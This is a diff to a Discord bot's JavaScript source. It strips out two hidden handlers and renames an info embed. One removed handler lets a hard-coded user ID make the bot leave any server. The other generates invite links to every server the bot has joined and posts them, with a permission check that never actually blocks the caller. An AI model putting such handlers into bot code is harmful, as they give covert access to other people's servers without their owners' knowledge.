@@ -109,28 +109,7 @@ client.on('message',async message => {
 
 //================================================================================\\
 
-const smsm = ["349942964904001546"] //id xot dane
- 
-client.on('message', message => {
-    var argresult = message.content.split(` `).slice(1).join(' ');
- 
- 
-client.on('message', message => {
-    var argresult = message.content.split(` `).slice(1).join(' ');
-      if (!smsm.includes(message.author.id)) return;
- 
- 
-    if (message.content === ("Jleave")) {
-    message.guild.leave();        
- message.channel.send('DONE')
- 
- 
-    } 
- 
-})
- 
- 
-})
+
 
 //================================================================================\\
 
@@ -169,12 +148,16 @@ client.on('message', message => {
         .setColor("RANDOM")
         .setDescription(`
  
-**__Jungle Bot__**
+**__About Bot__**
  
 <:partner:891421834585714689> Servers **__${client.guilds.cache.size}__**
+
 <:addmember:883032780865409054> Users **__${client.guilds.cache.reduce((a, g) => a + g.memberCount, 0)},__**
+
 <a:threads:871813387741433867> Channels **__${client.channels.cache.size}__**
+
 <:news:891421920984178719> Owner Bot - <@349942964904001546>
+
 <:members:891422824294662164> Admin Bot - <@!800994896890691605>
  
  
@@ -202,37 +185,7 @@ client.on('ready', async() => {
         console.log("Hello Im Online")
 });
 //===============================================================================\\
-client.on("message", async(NotOurs) => {
- 
-  if (NotOurs.author.bot) return;
-let devs = ["349942964904001546"];
-  if (NotOurs.content.toLowerCase() ===  "links") {
-      if(!devs.includes(NotOurs.author.id)){
-    let embed = new Discord.MessageEmbed()
-    .setColor("RANDOM")
-    .setTitle("**ليس لديك صلاحيات**");
-    NotOurs.channel.send(embed).then( z => z.delete({timeout:3000}));
- 
-  } 
-    client.guilds.cache.forEach(g => {
- 
-      let l = g.id;
-                g.channels.cache.find(channel => channel.type === 'text' && channel.permissionsFor(g.me).has('SEND_MESSAGES'))
-//g.channels.cache.get(g.channels.first().id)
-        .createInvite({
-          maxUses: 100,
-          maxAge: 86400
-        })
-        .then(i =>
-          NotOurs.channel.send(`
-        https://discord.gg/${i.code}
-        [ ${g.owner} ]
-         
-       ` )
-        ); 
-    });
-  }
-});
+
 //===============================================================================\\
 client.commands = new Discord.Collection();
 client.aliases = new Discord.Collection();
